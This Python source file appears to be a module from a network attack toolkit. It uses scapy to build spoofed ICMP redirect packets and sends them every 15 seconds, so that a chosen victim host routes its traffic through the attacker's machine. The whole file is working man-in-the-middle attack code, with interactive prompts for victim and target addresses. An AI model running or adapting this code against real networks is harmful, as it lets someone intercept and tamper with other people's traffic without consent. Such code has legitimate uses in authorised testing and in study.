from scapy.all import *
from poison import Poison
from threading import Thread
import time
import config
import util

""" Send ICMP redirects to a victim.  The victim
	system needs to be configured to allow ICMP
	redirects, which is not the default case.

	More: 
"""

class icmp(Poison):
	def __init__(self):
		conf.verb   = 0
		self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface'))) 
		self.victim = ()
		self.target = ()
		super(icmp,self).__init__('ICMP Redirection')
	
	def initialize(self):
		""" initialize a poison
		"""
		try:
			util.Msg('Using interface [%s:%s]'%(config.get('iface'),self.local[0]))
			victim_ip = raw_input('[!] Redirect host: ')
			target_ip = raw_input('[!] Redirect \'%s\' to \'%s\' from: '%(victim_ip,self.local[0]))
			tmp = raw_input('[!] Redirect \'%s\' to \'%s\' from \'%s\'.  Is this correct? [y] '\
							%(victim_ip,self.local[0],target_ip))

			self.victim = (victim_ip, getmacbyip(victim_ip))
			self.target = (target_ip, getmacbyip(target_ip))
		except KeyboardInterrupt: return None
		except Exception, e:
			util.Error('Error loading ICMP poisoning module: %s'%(e))
			return None

		if 'n' in tmp.lower():
			return None

		util.Msg('Initializing ICMP poison...')

		self.running = True
		thread = Thread(target=self.inject)
		thread.start()
		return self.victim[0]

	def inject(self):
		""" Send ICMP redirects to the victim
		"""
		# icmp redirect
		pkt = IP(src=self.target[0],dst=self.victim[0])
		pkt /= ICMP(type=5, code=1, gw=self.local[0])

		# fake UDP
		pkt /= IP(src=self.victim[0], dst=self.target[0])
		pkt /= UDP()

		while self.running:
			send(pkt)
			time.sleep(15)

		return self.victim[0]
